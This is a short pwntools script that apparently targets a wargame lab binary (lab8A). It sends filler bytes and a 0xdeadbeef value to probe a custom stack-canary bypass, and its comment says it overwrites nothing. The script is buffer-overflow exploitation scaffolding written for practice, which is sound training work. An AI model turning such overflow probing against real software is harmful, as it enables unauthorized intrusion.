from pwn import *
settings = {
    "binary"        : "/levels/lab08/lab8A",
}
def exploit():

    # This is to simply check the custom-canary bypass, we are not overwriting anything.
    p.sendlineafter("Enter Your Favorite Author's Last Name: ","A")

    payload = "B"*16	# fill the buf[24] in findSomeWords()
    payload = payload + p32(0xdeadbeef)
	
    p.sendafter("..I like to read ^_^ <==  ",payload)
    p.recv()
	
    return 0

# Initial setup
if __name__  == "__main__":
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = process(binary.path,stdin=PTY)
    exploit()
